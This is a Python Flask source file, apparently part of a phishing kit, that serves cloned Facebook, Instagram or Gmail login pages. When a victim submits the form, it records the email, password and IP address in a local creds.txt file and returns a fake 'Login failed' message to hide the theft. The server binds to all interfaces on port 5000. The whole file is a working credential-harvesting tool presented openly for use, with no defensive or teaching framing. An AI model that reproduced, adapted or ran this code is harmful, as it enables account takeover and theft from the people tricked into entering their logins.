from flask import Flask, request, send_file
import os

# 📁 Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATIC_DIR = os.path.join(BASE_DIR, "clones", "assets")

# ✅ Flask app with static path
app = Flask(
    __name__,
    static_folder="core/clones/assets",      # Folder jahan logo hain
    static_url_path="/assets"                # Web browser se path
)

# 🔗 HTML Templates
TEMPLATES = {
    "facebook": os.path.join(BASE_DIR, "clones/facebook.html"),
    "instagram": os.path.join(BASE_DIR, "clones/instagram.html"),
    "gmail": os.path.join(BASE_DIR, "clones/gmail.html")
}

# 👤 This will be set by main menu
selected_site = "facebook"

@app.route("/", methods=["GET", "POST"])
def serve_phish():
    if selected_site not in TEMPLATES:
        return "<h3>Error: Invalid site selected</h3>"

    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        ip = request.remote_addr

        # 📝 Save credentials
        os.makedirs("data/logs", exist_ok=True)
        with open("data/logs/creds.txt", "a") as f:
            f.write(f"IP: {ip}, Email: {email}, Password: {password}\n")

        return "<h3>Login failed. Please try again.</h3>"

    return send_file(TEMPLATES[selected_site])

def start_cloner(site_name):
    global selected_site
    selected_site = site_name.lower()
    print(f"[*] Starting {site_name.capitalize()} phishing server on http://localhost:5000 ...")
    app.run(host="0.0.0.0", port=5000)

